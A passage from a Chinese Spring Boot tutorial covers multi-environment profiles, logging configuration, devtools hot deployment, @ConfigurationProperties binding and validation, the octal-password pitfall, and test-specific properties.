**方式二：使用临时属性设置配置文件路径，这个是全路径名**\n\n```bash\n--spring.config.location=classpath:/带后缀的配置文件名字\n\n#也可以设置加载多个配置文件\n--spring.config.location=classpath:/带后缀的配置文件名字,classpath:/带后缀的配置文件名字\n```\n\n![](https://img.jwt1399.top/img/202209111933941.png)\n\n<font color=\"#f0f\"><b>温馨提示</b></font>\n\n​\t\t我们现在研究的都是SpringBoot单体项目，就是单服务器版本。其实企业开发现在更多的是使用基于SpringCloud技术的多服务器项目。这种配置方式上面的方式完全不一样，所有的服务器将不再设置自己的配置文件，而是通过配置中心获取配置，动态加载配置信息。为什么这样做？集中管理。\n\n**总结**\n\n1. 配置文件可以修改名称，通过启动参数设定\n2. 配置文件可以修改路径，通过启动参数设定\n3. 微服务开发中配置文件通过配置中心进行设置\n\n##  3.多环境开发\n\n程序最终要放到服务器上去运行。每个计算机环境不一样，这就是多环境。常见的多环境开发主要兼顾3种环境设置。\n\n- 开发环境——自己用的\n\n- 测试环境——自己公司用的\n\n- 生产环境——甲方爸爸用的\n\n因为这是绝对不同的三台电脑，所以环境肯定有所不同，比如连接的数据库不一样，设置的访问端口不一样等等。\n\n<img src=\"https://img.jwt1399.top/img/202209112043599.png\"  style=\"zoom:67%;\" />\n\n### ①yaml单一文件版\n\n多环境开发就是针对不同的环境设置不同的配置属性即可。比如你自己开发时，配置你的端口如下：\n\n```yaml\nserver:\n  port: 80\n```\n\n如何设计两组环境呢？中间使用三个减号分隔开\n\n```yaml\nserver:\n  port: 80\n---\nserver:\n  port: 81\n```\n\n如何区分两种环境呢？起名字呗\n\n```yaml\nspring:  # 环境1\n\tprofiles: pro   \nserver:\n\tport: 80\n---\nspring:  # 环境2\n\tprofiles: dev  \nserver:\n\tport: 81\n```\n\n那用哪一个呢？设置默认启动哪个就可以了\n\n```yaml\nspring:\n\tprofiles:\n\t\tactive: pro\t\t# 启动pro\n---\nspring:\n\tprofiles: pro\nserver:\n\tport: 80\n---\nspring:\n\tprofiles: dev\nserver:\n\tport: 81\n```\n\n其中关于环境名称定义上述格式是过时格式，标准格式如下\n\n```yaml\nspring:\n\tconfig:\n    \tactivate:\n        \ton-profile: pro\n```\n\n**总结**\n\n1. 多环境开发需要设置若干种常用环境，例如开发、生产、测试环境\n2. yaml格式中设置多环境使用---区分环境设置边界\n3. 每种环境的区别在于加载的配置属性不同\n4. 启用某种环境时需要指定启动时使用该环境\n\n### ②yaml多文件版\n\n将所有的配置都放在一个配置文件中，尤其是每一个配置应用场景都不一样，这显然不合理，于是就有了将一个配置文件拆分成多个配置文件的想法。拆分后，每个配置文件中写自己的配置，主配置文件中写清楚用哪一个配置文件就好了。\n\n**主配置文件**\n\n```yaml\nspring:\n\tprofiles:\n\t\tactive: pro\t\t# 启动pro\n```\n\n**环境配置文件**\n\n```yaml\nserver:\n\tport: 80\n```\n\n环境配置文件因为每一个都是配置自己的项，所以连名字都不用写里面了。\n\n那如何区分这是哪一组配置呢？使用文件名区分。文件的命名规则为：application-环境名.yml。\n\n**application-pro.yaml**\n\n```yaml\nserver:\n\tport: 80\n```\n\n**application-dev.yaml**\n\n```yaml\nserver:\n\tport: 81\n```\n\n在配置文件中，如果某些配置项所有环境都一样，可以将这些项写入到主配置中，只有哪些有区别的项才写入到环境配置文件中。\n\n- 主配置文件中设置公共配置（全局）\n- 环境配置文件中设置冲突属性（局部）\n\n**总结**\n\n1. 可以使用独立配置文件定义环境属性\n\n2. 独立配置文件便于线上系统维护更新并保障系统安全性\n\n\n### ③properties多文件版\n\nproperties文件多环境配置仅支持多文件格式\n\n**主配置文件**\n\n```properties\nspring.profiles.active=pro\n```\n\n**环境配置文件**\n\n**application-pro.properties**\n\n```properties\nserver.port=80\n```\n\n**application-dev.properties**\n\n```properties\nserver.port=81\n```\n\n文件的命名规则为：application-环境名.properties。\n\n### ④配置文件书写技巧\n\n作为程序员在搞配置的时候往往处于一种分久必合合久必分的局面。开始先写一起，后来为了方便维护就拆分。对于多环境开发也是如此，下面给大家说一下如何基于多环境开发做配置独立管理，务必掌握。\n\n**a.准备工作**\n\n将所有的配置根据功能对配置文件中的信息进行拆分，并制作成独立的配置文件，命名规则如下\n\n- application-devDB.yml\n- application-devRedis.yml\n- application-devMVC.yml\n\n**b.使用**\n\n使用include属性在激活指定环境的情况下，同时对多个环境进行加载使其生效，多个环境间使用逗号分隔\n\n```yaml\nspring:\n\tprofiles:\n    \tactive: dev\n        include: devDB,devRedis,devMVC\n```\n\n现在相当于加载dev配置时，再加载对应的3组配置，从结构上就很清晰，用了什么，对应的名称是什么\n\n`注意`：当主环境dev与其他环境有相同属性时，主环境属性生效；其他环境中有相同属性时，最后加载的环境属性生效\n\n**c.改良**\n\n但是上面的设置也有一个问题，比如我要切换dev环境为pro时，include也要修改。因为include属性只能使用一次，这就比较麻烦了。SpringBoot从2.4版开始使用group属性替代include属性，降低了配置书写量。简单说就是我先写好，你爱用哪个用哪个。\n\n```yaml\nspring:\n\tprofiles:\n    \tactive: dev\n        group:\n        \t\"dev\": devDB,devRedis,devMVC\n      \t\t\"pro\": proDB,proRedis,proMVC\n      \t\t\"test\": testDB,testRedis,testMVC\n```\n\n### ⑤多环境开发控制\n\n如果maven和SpringBoot同时设置了多环境的话怎么搞。要想处理这个冲突问题，你要先理清一个关系，究竟谁在多环境开发中其主导地位。maven是做什么的？项目构建管理的，最终生成代码包的，SpringBoot是干什么的？简化开发的。简化，又不是其主导作用。最终还是要靠maven来管理整个工程，所以SpringBoot应该听maven的。大体思想如下：\n\n- 先在maven环境中设置用什么具体的环境\n- 在SpringBoot中读取maven设置的环境即可\n\n**a.maven中设置多环境（使用属性方式区分环境）**\n\n```xml\n<profiles>\n    <profile>     <!--环境1-->\n        <id>env_dev</id>\n        <properties>\n            <profile.active>dev</profile.active>\n        </properties>\n        <activation>\n            <activeByDefault>true</activeByDefault>\t\t<!--默认启动环境-->\n        </activation>\n    </profile>\n  \n    <profile>     <!--环境2-->\n        <id>env_pro</id>\n        <properties>\n            <profile.active>pro</profile.active>\n        </properties>\n    </profile>\n</profiles>\n```\n\n**b.SpringBoot中读取maven设置值**\n\n```yaml\nspring:\n\tprofiles:\n    \tactive: @profile.active@\n```\n\n上面的@属性名@就是读取maven中配置的属性值的语法格式。\n\n**总结**\n\n1. 当Maven与SpringBoot同时对多环境进行控制时，以Mavn为主，SpringBoot使用@..@占位符读取Maven对应的配置属性值\n2. 基于SpringBoot读取Maven配置属性的前提下，如果在IDEA下测试工程时pom.xml每次更新需要手动compile方可生效\n\n## 4.日志\n\n日志就是记录程序日常运行的信息，主要作用如下：\n\n- 编程期调试代码\n- 运营期记录信息\n  - 记录日常运营重要信息（峰值流量、平均响应时长……）\n  - 记录应用报错信息（错误堆栈）\n  - 记录运维过程数据（扩容、宕机、报警……）\n\n\n### ①开启日志\n\n**步骤①**：添加日志记录操作\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController extends BaseClass{\n    private static final Logger log = LoggerFactory.getLogger(BookController.class);\n    @GetMapping\n    public String getById(){\n        log.debug(\"debug...\");\n        log.info(\"info...\");\n        log.warn(\"warn...\");\n        log.error(\"error...\");\n        return \"springboot is running...\";\n    }\n}\n```\n\n上述代码中log对象就是用来记录日志的对象，下面的log.debug，log.info这些操作就是写日志的API了。\n\n**步骤②**：设置日志输出级别\n\n日志设置好以后可以根据设置选择哪些参与记录。这里是根据日志的级别来设置的。日志的级别分为6种，分别是：\n\n- TRACE：运行堆栈信息，使用率低\n- **DEBUG**：程序员调试代码使用\n- **INFO**：记录运维过程数据\n- **WARN**：记录运维过程报警数据\n- **ERROR**：记录错误堆栈信息\n- FATAL：灾难信息，合并计入ERROR\n\n一般情况下，开发时候使用DEBUG，上线后使用INFO，运维信息记录使用WARN即可。\n\n下面就设置一下日志级别：\n\n```yaml\n# 开启debug模式，输出调试信息，常用于检查系统运行状况\ndebug: true\n```\n\n这么设置太简单粗暴了，日志系统通常都提供了细粒度的控制\n\n```yaml\n# 开启debug模式，输出调试信息，常用于检查系统运行状况\ndebug: true\n\n# 设置日志级别，root表示根节点，即整体应用日志级别\nlogging:\n\tlevel:\n    \troot: debug\n```\n\n还可以再设置更细粒度的控制，可以直接控制指定包对应的日志输出级别\n\n```yaml\nlogging:\n    level:\n    \troot: warn\n    \t# 设置某包包设置日志级别\n      com.jianjian.config: debug\n```\n\n**步骤③**：设置日志组，控制指定包对应的日志输出级别\n\n```yaml\nlogging:\n\t# 设置日志组\n    group:\n    \t# 自定义组名，设置当前组中所包含的包\n        book: com.jianjian.controller\n        test: com.jianjian.dao,com.jianjian.service\n    level:\n    \troot: warn\n      # 为对应组设置日志级别\n      book: debug\n      test: info\n```\n\n**总结**\n\n1. 日志用于记录开发调试与运维过程消息\n2. 日志的级别共6种，通常使用4种即可，分别是DEBUG，INFO，WARN，ERROR\n3. 可以通过日志组或代码包的形式进行日志显示级别的控制\n\n### ②@Slf4j\n\n每个类都要写创建日志记录对象，太繁琐，可以使用lombok给我们提供的工具类。\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController extends BaseClass{\n    private static final Logger log = LoggerFactory.getLogger(BookController.class);\t//这一句可以不写了\n}\n```\n\n导入lombok后使用@Slf4j注解搞定，日志对象名为log\n\n```java\n@Slf4j\t\t//这个注解替代了上面那一行\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController extends BaseClass{\n    @GetMapping\n    public String getById(){\n        log.debug(\"debug...\");\n        log.info(\"info...\");\n        log.warn(\"warn...\");\n        log.error(\"error...\");\n        return \"springboot is running...\";\n    }\n}\n```\n\n### ③日志输出格式\n\n目前记录的格式是SpringBoot给我们提供的，如果想自定义控制就需要自己设置了。先分析一下当前日志的记录格式。\n\n![](https://img.jwt1399.top/img/202209121704365.png)\n\n- 级别用于做筛选过滤，PID与线程名用于做精准分析。\n\n- 所属类/接口名：当名称过长时，简化包名书写为首字母，甚至直接删除\n\n下面是模拟上方图片中日志格式的配置方式\n\n```yaml\nlogging:\n\tpattern:\n    \tconsole: \"%d %clr(%p) --- [%16t] %clr(%-40.40c){cyan} : %m %n\"\n```\n\n- %d： 时间\n- %clr：带颜色显示\n- %p：   PID\n- %16t：%t代表线程 ，16代码显示长度为16  \n- %-40.40c：  %c代表所属类，-40代表左对齐显示长度40，.40长度超过40开始截断\n- {cyan}：自定义显示颜色\n- %m：消息\n- %n：换行\n\n详细可参考：[log4j 日志格式详解](https://blog.csdn.net/zhangyunfei1984/article/details/115419360)\n\n### ④日志文件\n\n如何把日志记录到文件中，方便后期维护查阅。设置日志文件名即可。\n\n```yaml\nlogging:\n\tfile:\n    \tname: server.log\n```\n\n为了便于维护，可以限制每个日志文件的大小，产生多个日志文件。\n\n```yaml\nlogging:\n\tlogback:\n    \trollingpolicy:\n        \tmax-file-size: 3KB  # 限制每个日志文件大小\n            file-name-pattern: server.%d{yyyy-MM-dd}.%i.log #日志文件命名规则\n```\n\n以上格式是基于logback日志技术设置每日日志文件的设置格式，要求容量到达3KB以后就转存信息到第二个文件中。文件命名规则中的%d标识日期，%i是一个递增变量，用于区分日志文件。\n\n# 开发实用篇\n\n## 1.热部署\n\n### ①什么是热部署？\n\n简单说就是你程序改了，现在要重新启动服务器，嫌麻烦？不用重启，服务器会自己悄悄的把更新后的程序给重新加载一遍，这就是热部署。\n\n热部署的功能是如何实现的呢？这就要分两种情况来说了，非springboot工程和springboot工程的热部署实现方式完全不一样。先说一下原始的非springboot项目是如何实现热部署的。\n\n**非springboot项目热部署实现原理**\n\n开发非springboot项目时，我们要制作一个web工程并通过tomcat启动，通常需要先安装tomcat服务器到磁盘中，开发的程序配置发布到安装的tomcat服务器上。如果想实现热部署的效果有两种做法，一种是在tomcat服务器的配置文件中进行配置。另一种做法是通过IDE工具进行配置。核心思想是一样的，就是使用服务器去监控其中加载的应用，发现产生了变化就重新加载一次。\n\n**springboot项目热部署实现原理**\n\n​\t\t基于springboot开发的web工程其实有一个显著的特征，就是tomcat服务器内置了。服务器是以一个对象的形式在spring容器中运行的。本来我们期望于tomcat服务器加载程序后由tomcat服务器盯着程序，你变化后我就重新启动重新加载，但是现在tomcat和我们的程序是平级的了，都是spring容器中的组件，这下就麻烦了，缺乏了一个直接的管理权，那该怎么做呢？简单，再搞一个程序X在spring容器中盯着你原始开发的程序A不就行了吗？确实，搞一个盯着程序A的程序X就行了，如果你自己开发的程序A变化了，那么程序X就命令tomcat容器重新加载程序A就OK了。并且这样做有一个好处，spring容器中东西不用全部重新加载一遍，只需要重新加载你开发的程序那一部分就可以了，这下效率又高了，挺好。\n\n​\t下面就说说，怎么搞出来这么一个程序X，肯定不是我们自己手写了，springboot早就做好了，搞一个坐标导入进去就行了。\n\n### ②手动启动热部署\n\n**步骤①**：导入开发者工具对应的坐标\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-devtools</artifactId>\n    <optional>true</optional>\n</dependency>\n```\n\n**步骤②**：构建项目，可以使用快捷键（ctrl+F9或者command+F9）激活此功能\n\n![](https://img.jwt1399.top/img/202209122115363.png)\n\n**底层的工作工程原理：重启与重载**\n\n​\t\t一个springboot项目在运行时实际上是分两个过程进行的，根据加载的东西不同，划分成base类加载器与restart类加载器。\n\n- base类加载器：用来加载jar包中的类，jar包中的类和配置文件由于不会发生变化，因此不管加载多少次，加载的内容不会发生变化\n- restart类加载器：用来加载开发者自己开发的类、配置文件、页面等信息，这一类文件受开发者影响\n\n​\t\t当springboot项目启动时，base类加载器执行，加载jar包中的信息后，restart类加载器执行，加载开发者制作的内容。当执行构建项目后，由于jar中的信息不会变化，因此base类加载器无需再次执行，所以仅仅运行restart类加载即可，也就是将开发者自己制作的内容重新加载就行了，这就完成了一次热部署的过程，也可以说热部署的过程实际上是重新加载restart类加载器中的信息。\n\n### ③自动启动热部署\n\n上述过程每次进行热部署都需要开发者手工操作，不管是点击按钮还是快捷键都需要开发者手工执行。\n\n自动热部署其实就是设计一个开关，打开这个开关后，IDE工具就可以自动热部署。因此这个操作和IDE工具有关，以下以idea为例设置idea中启动热部署\n\n**步骤①**：设置自动构建项目\n\n打开【File】，选择【settings...】,在面板左侧的菜单中找到【Compile】选项，然后勾选【Build project automatically】，意思是自动构建项目\n\n![](https://img.jwt1399.top/img/202209122128893.png)\n\n**步骤②**：允许在程序运行时进行自动构建\n\n- 老版IDEA操作方法：\n\n使用快捷键【Ctrl+Alt+Shift+/ 或者 command+option+shift+/】打开维护面板，选择第1项【Registry...】\n\n![](https://img.jwt1399.top/img/202209122136780.png)\n\n在选项中搜索comple，然后勾选对应项即可\n\n<img src=\"https://img.jwt1399.top/img/202209122136899.png\"  style=\"zoom:80%;\" />\n\n- 新版本IDEA操作方法\n\n![](https://img.jwt1399.top/img/202209122136714.png)\n\n<font color=\"#ff0000\"><b>关注</b></font>：如果你每敲一个字母，服务器就重新构建一次，这未免有点太频繁了，所以idea设置当idea工具失去焦点5秒后进行热部署。其实就是你从idea工具中切换到其他工具时进行热部署，比如改完程序需要到浏览器上去调试，这个时候idea就自动进行热部署操作。\n\n### ④热部署范围配置\n\n其实并不是所有的文件修改都会激活热部署的，原因在于在开发者工具中有一组配置，当满足了配置中的条件后，才会启动热部署，配置中默认不参与热部署的目录信息如下\n\n- /META-INF/maven\n- /META-INF/resources\n- /resources\n- /static\n- /public\n- /templates\n\n以上目录中的文件如果发生变化，是不参与热部署的。如果想修改配置，可以通过application.yml文件进行设定哪些文件不参与热部署操作\n\n```yaml\nspring:\n  devtools:\n    restart:\n      # 设置不参与热部署的文件或文件夹\n      exclude: static/**,public/**,config/application.yml\n```\n\n### ⑤关闭热部署\n\n线上环境运行时是不可能使用热部署功能的，所以需要强制关闭此功能，通过配置可以关闭此功能。\n\n```yaml\nspring:\n  devtools:\n    restart:\n      enabled: false\n```\n\n如果当心配置文件层级过多导致相符覆盖最终引起配置失效，可以提高配置的层级，在更高层级中配置关闭热部署。例如在启动容器前通过系统属性设置关闭热部署功能。\n\n```java\n@SpringBootApplication\npublic class SSMPApplication {\n    public static void main(String[] args) {\n        System.setProperty(\"spring.devtools.restart.enabled\",\"false\");\n        SpringApplication.run(SSMPApplication.class);\n    }\n}\n```\n\n## 2.配置进阶\n\n### ①@ConfigurationProperties\n\n在基础篇学习了@ConfigurationProperties注解，此注解的作用是用来为bean绑定属性的。\n\n**a.**开发者可以在yml配置文件中以对象的格式添加若干属性\n\n```YML\nservers:\n  ip-address: 192.168.0.1 \n  port: 2345\n  timeout: -1\n```\n\n**b.**然后再开发一个用来封装数据的实体类，注意要提供属性对应的setter方法\n\n```java\n@Component\n@Data\npublic class ServerConfig {\n    private String ipAddress;\n    private int port;\n    private long timeout;\n}\n```\n\n**c.**使用`@ConfigurationProperties`注解就可以将配置中的属性值关联到开发的模型类上\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    private String ipAddress;\n    private int port;\n    private long timeout;\n}\n```\n\n这样加载对应bean的时候就可以直接加载配置属性值了。\n\n**d.**使用@ConfigurationProperties注解时，会出现一个提示信息\n\n![](https://img.jwt1399.top/img/202209171203135.png)\n\n出现这个提示后只需要添加一个坐标此提醒就消失了\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n```\n\n> 但是目前我们学的都是给自定义的bean使用这种形式加载属性值，如果是第三方的bean呢？能不能用这种形式加载属性值呢？为什么会提出这个疑问？原因就在于当前@ConfigurationProperties注解是写在类定义的上方，而第三方开发的bean源代码不是你自己书写的，你也不可能到源代码中去添加@ConfigurationProperties注解，这种问题该怎么解决呢？下面就来说说这个问题。\n\n使用@ConfigurationProperties注解其实也可以为第三方bean加载属性，格式特殊一点而已。\n\n**步骤①**：使用@Bean注解定义第三方bean\n\n```java\n@Bean\npublic DruidDataSource datasource(){\n    DruidDataSource ds = new DruidDataSource();\n    return ds;\n}\n```\n\n**步骤②**：在yml中定义要绑定的属性，注意datasource此时全小写\n\n```yaml\ndatasource:\n  driverClassName: com.mysql.jdbc.Driver\n```\n\n**步骤③**：使用@ConfigurationProperties注解为第三方bean进行属性绑定，注意前缀是全小写的datasource\n\n```java\n@Bean\n@ConfigurationProperties(prefix = \"datasource\")\npublic DruidDataSource datasource(){\n    DruidDataSource ds = new DruidDataSource();\n    return ds;\n}\n```\n\n操作方式完全一样，只不过@ConfigurationProperties注解不仅能添加到类上，还可以添加到方法上，添加到类上是为spring容器管理的当前类的对象绑定属性，添加到方法上是为spring容器管理的当前方法的返回值对象绑定属性，其实本质上都一样。\n\n### ②@EnableConfigurationProperties\n\n> 目前我们定义bean不是通过`@Component`定义就是通过`@Bean`定义，使用`@ConfigurationProperties`注解可以为bean进行属性绑定，那在一个业务系统中，哪些bean通过注解@ConfigurationProperties去绑定属性了呢？因为这个注解不仅可以写在类上，还可以写在方法上，所以找起来就比较麻烦了。\n>\n> 为了解决这个问题，spring给我们提供了一个全新的注解，专门标注使用`@ConfigurationProperties`注解绑定属性的bean是哪些。这个注解叫做`@EnableConfigurationProperties`。具体如何使用呢？\n\n**步骤①**：在配置类上开启`@EnableConfigurationProperties`注解，并标注要使用@ConfigurationProperties注解绑定属性的类\n\n```java\n@SpringBootApplication\n@EnableConfigurationProperties(ServerConfig.class)\npublic class SpringbootConfigurationApplication {\n}\n```\n\n**步骤②**：在对应的类上直接使用@ConfigurationProperties进行属性绑定\n\n```java\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    private String ipAddress;\n    private int port;\n    private long timeout;\n}\n```\n\n有人感觉这没区别啊？注意观察，现在绑定属性的ServerConfig类并没有声明`@Component`注解。当使用`@EnableConfigurationProperties`注解时，spring会默认将其标注的类定义为bean，因此无需再次声明`@Component`注解了。\n\n**总结**\n\n1. 使用@ConfigurationProperties可以为使用@Bean声明的第三方bean绑定属性\n2. 当使用@EnableConfigurationProperties声明进行属性绑定的bean后，无需使用@Component注解再次进行bean声明\n\n### ③松散绑定\n\n在进行属性绑定时，可能会遇到如下情况，为了进行标准命名，开发者会将属性名严格按照驼峰命名法书写，在yml配置文件中将datasource修改为dataSource，此时程序可以正常运行\n\n```yaml\ndataSource:\n  driverClassName: com.mysql.jdbc.Driver\n```\n\n然后又将代码中的前缀datasource修改为dataSource\n\n```java\n@Bean\n@ConfigurationProperties(prefix = \"dataSource\")\npublic DruidDataSource datasource(){\n    DruidDataSource ds = new DruidDataSource();\n    return ds;\n}\n```\n\n此时就发生了编译错误，而且并不是idea工具导致的，运行后依然会出现问题，配置属性名dataSource是无效的\n\n```bash\nConfiguration property name 'dataSource' is not valid:\n\n    Invalid characters: 'S'\n    Bean: datasource\n    Reason: Canonical names should be kebab-case ('-' separated), lowercase alpha-numeric characters and must start with a letter\n\nAction:\nModify 'dataSource' so that it conforms to the canonical names requirements.\n```\n\n为什么会出现这种问题，这就要来说一说springboot进行属性绑定时的一个重要知识点了，有关属性名称的宽松绑定，也可以称为宽松绑定。\n\n> 什么是宽松绑定？实际上是springboot进行编程时人性化设计的一种体现，即配置文件中的命名格式与变量名的命名格式可以进行格式上的最大化兼容。兼容到什么程度呢？几乎主流的命名格式都支持，例如：\n\n在ServerConfig中的ipAddress属性名\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    private String ipAddress;\n}\n```\n\n可以与下面的配置属性名规则全兼容\n\n```yaml\nservers:\n  ipAddress: 192.168.0.2       # 驼峰模式\n  ip_address: 192.168.0.2      # 下划线模式\n  ip-address: 192.168.0.2      # 烤肉串模式\n  IP_ADDRESS: 192.168.0.2      # 常量模式\n```\n\n也可以说，以上4种模式最终都可以匹配到ipAddress这个属性名。为什么这样呢？原因就是在进行匹配时，配置中的名称要去掉中划线和下划线后，忽略大小写的情况下去与java代码中的属性名进行忽略大小写的等值匹配，以上4种命名去掉下划线中划线忽略大小写后都是一个词ipaddress，java代码中的属性名忽略大小写后也是ipaddress，这样就可以进行等值匹配了，这就是为什么这4种格式都能匹配成功的原因。不过springboot官方推荐使用烤肉串模式，也就是中划线模式。\n\n到这里我们掌握了一个知识点，就是命名的规范问题。再来看开始出现的编程错误信息\n\n```bash\nConfiguration property name 'dataSource' is not valid:\n\n    Invalid characters: 'S'\n    Bean: datasource\n    Reason: Canonical names should be kebab-case ('-' separated), lowercase alpha-numeric characters and must start with a letter\n\nAction:\nModify 'dataSource' so that it conforms to the canonical names requirements.\n```\n\n其中Reason描述了报错的原因，规范的名称应该是烤肉串(kebab)模式(case)，即使用-分隔，使用小写字母数字作为标准字符，且必须以字母开头。然后再看我们写的名称dataSource，就不满足上述要求。闹了半天，在书写前缀时，这个词不是随意支持的，必须使用上述标准。\n\n最后说一句，以上规则仅针对springboot中@ConfigurationProperties注解进行属性绑定时有效，对@Value注解进行属性映射无效。\n\n**总结**\n\n1. @ConfigurationProperties绑定属性时支持属性名宽松绑定，这个宽松体现在属性名的命名规则上\n2. @Value注解不支持松散绑定规则\n3. 绑定前缀名推荐采用烤肉串命名规则，即使用中划线做分隔符\n\n### ④计量单位绑定\n\n在配置中，我们书写如下配置值，其中第三项超时时间timeout描述了服务器操作超时时间，当前值是-1表示永不超时。\n\n```yaml\nservers:\n  ip-address: 192.168.0.1 \n  port: 2345\n  timeout: -1\n```\n\n> 但是每个人对这个值的理解会产生不同，比如线上服务器完成一次主从备份，配置超时时间240，这个240如果单位是秒就是超时时间4分钟，如果单位是分钟就是超时时间4小时。这个时候问题就来了，怎么解决这个误会？\n\n除了加强约定之外，springboot充分利用了JDK8中提供的全新的计量单位的新数据类型，从根本上解决这个问题。以下模型类中添加了两个JDK8中新增的类，分别是Duration和DataSize\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\npublic class ServerConfig {\n    @DurationUnit(ChronoUnit.HOURS)\n    private Duration serverTimeOut;\n    @DataSizeUnit(DataUnit.MEGABYTES)\n    private DataSize dataSize;\n}\n```\n\n- **Duration**：表示时间间隔，可以通过@DurationUnit注解描述时间单位，例如上例中描述的单位为小时（ChronoUnit.HOURS）\n\n- **DataSize**：表示存储空间，可以通过@DataSizeUnit注解描述存储空间单位，例如上例中描述的单位为MB（DataUnit.MEGABYTES）\n\n​\t\t使用上述两个单位就可以有效避免因沟通不同步或文档不健全导致的信息不对称问题，从根本上解决了问题，避免产生误读。\n\n### ⑤属性校验\n\n> 在yml文件中书写配置时由于无法感知模型类中的数据类型，就会出现类型不匹配的问题，比如代码中需要int类型，配置中给了非法的数值，例如写一个“a\"，这种数据肯定无法有效的绑定，还会引发错误。\t\t\n>\n> SpringBoot给出了强大的数据校验功能，可以有效的避免此类问题的发生。在javaEE的JSR303规范中给出了具体的数据校验标准，开发者可以根据自己的需要选择对应的校验框架，此处使用Hibernate提供的校验框架来作为实现进行数据校验。\n\n**步骤①**：开启校验框架\n\n```xml\n<!--1.导入JSR303规范接口-->\n<dependency>\n    <groupId>javax.validation</groupId>\n    <artifactId>validation-api</artifactId>\n</dependency>\n<!--使用hibernate框架提供的校验器做实现-->\n<dependency>\n    <groupId>org.hibernate.validator</groupId>\n    <artifactId>hibernate-validator</artifactId>\n</dependency>\n```\n\n**步骤②**：在需要开启校验功能的类上使用注解@Validated开启校验功能\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\n@Validated  //开启对当前bean的属性注入校验\npublic class ServerConfig {\n}\n```\n\n**步骤③**：对具体的字段设置校验规则\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"servers\")\n//开启对当前bean的属性注入校验\n@Validated\npublic class ServerConfig {\n    //设置具体的规则\n    @Max(value = 8888,message = \"最大值不能超过8888\")\n    @Min(value = 202,message = \"最小值不能低于202\")\n    private int port;\n}\n```\n\n通过设置数据格式校验，就可以有效避免非法数据加载。\n\n### ⑥属性注入问题\n\n先把问题描述一下，开发者连接数据库操作，但是运行程序后显示的信息是密码错误。\n\n```bash\njava.sql.SQLException: Access denied for user 'root'@'localhost' (using password: YES)\n```\n\n这是用户名和密码不匹配，就是密码输入错了，但是问题就在于密码并没有输入错误。如果是初学者，估计这会心态就崩了，我密码没错啊，你怎么能说我有错误呢？来看看用户名密码的配置是如何写的：\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    username: root\n    password: 0127\n```\n\n这名开发者的生日是1月27日，所以密码就使用了0127，其实问题就出在这里了。\n\n在整数相关知识中有这么一句话，**支持二进制，八进制，十六进制**\n\n<img src=\"https://img.jwt1399.top/img/202209131842566.png\" style=\"zoom:80%;\" />\n\n这个问题就出在这里了，因为0127在开发者眼中是一个字符串“0127”，但是在springboot看来，这就是一个数字，而且是一个八进制的数字。当后台使用String类型接收数据时，如果配置文件中配置了一个整数值，他是先按照整数进行处理，读取后再转换成字符串。巧了，0127撞上了八进制的格式，所以后台先转换为十进制数字87再读取为“87”，这就导致密码错误的报错。解决方法为加上引号\n\n这里提两个注意点，第一，字符串标准书写加上引号包裹，养成习惯，第二，遇到0开头的数据多注意吧。\n\n## 3.测试进阶\n\n### ①加载测试专用属性\n\n测试过程本身并不是一个复杂的过程，但是很多情况下测试时需要模拟一些线上情况，或者模拟一些特殊情况。如果当前环境按照线上环境已经设定好了，这个时候我们能不能每次测试的时候都去修改源码 application.yml 中的配置进行测试呢？显然是不行的。每次测试前改过来，每次测试后改回去，这太麻烦了。于是我们就想，需要在测试环境中创建一组临时属性，去覆盖我们源码中设定的属性，这样测试用例就相当于是一个独立的环境，能够独立测试，这样就方便多了。\n\n**临时属性**\n\nSpringBoot已经为我们开发者早就想好了这种问题该如何解决，并且提供了对应的功能入口。在测试用例程序中，可以通过对注解@SpringBootTest添加属性来模拟临时属性，具体如下：\n\n```JAVA\n//properties属性可以为当前测试用例添加临时的属性配置\n@SpringBootTest(properties = {\"test.prop=testValue1\"})\npublic class PropertiesAndArgsTest {\n\n    @Value(\"${test.prop}\")\n    private String msg;\n    \n    @Test\n    void testProperties(){\n        System.out.println(msg);\n    }\n}\n```\n\n使用注解@SpringBootTest的properties属性就可以为当前测试用例添加临时的属性，覆盖源码配置文件中对应的属性值进行测试。\n\n**临时参数**\n\n通过命令行参数也可以设置属性值。而且线上启动程序时，通常都会添加一些专用的配置信息。\n\n```JAVA\n//args属性可以为当前测试用例添加临时的命令行参数\n@SpringBootTest(args={\"--test.prop=testValue2\"})\npublic class PropertiesAndArgsTest {\n    \n    @Value(\"${test.prop}\")\n    private String msg;\n    \n    @Test\n    void testProperties(){\n        System.out.println(msg);\n    }\n}\n```\n\n使用注解@SpringBootTest的args属性就可以为当前测试用例模拟命令行参数并进行测试。\n\n**总结**\n\n加载测试临时属性可以通过注解@SpringBootTest的properties和args属性进行设定，此设定应用范围仅适用于当前测试用例\n\n### ②加载测试专用配置\n\n临时配置一些专用于测试环境的bean的需求，现在我们的需求其实就是在测试环境中再添加一个配置类，然后启动测试环境时，生效此配置就行了。其实做法和spring环境中加载多个配置信息的方式完全一样。具体操作步骤如下：\n\n**步骤①**：在测试包test中创建专用的测试环境配置类\n\n```java\n@Configuration\npublic class MsgConfig {\n    @Bean\n    public String msg(){\n        return \"bean msg\";\n    }\n}\n```\n\n上述配置仅用于演示当前实验效果，实际开发可不能这么注入String类型的数据\n\n**步骤②**：在启动测试环境时，导入测试环境专用的配置类，使用@Import注解即可实现\n\n```java\n@SpringBootTest\n@Import({MsgConfig.class})\npublic class ConfigurationTest {\n\n    @Autowired\n    private String msg;\n\n    @Test\n    void testConfiguration(){\n        System.out.println(msg);\n    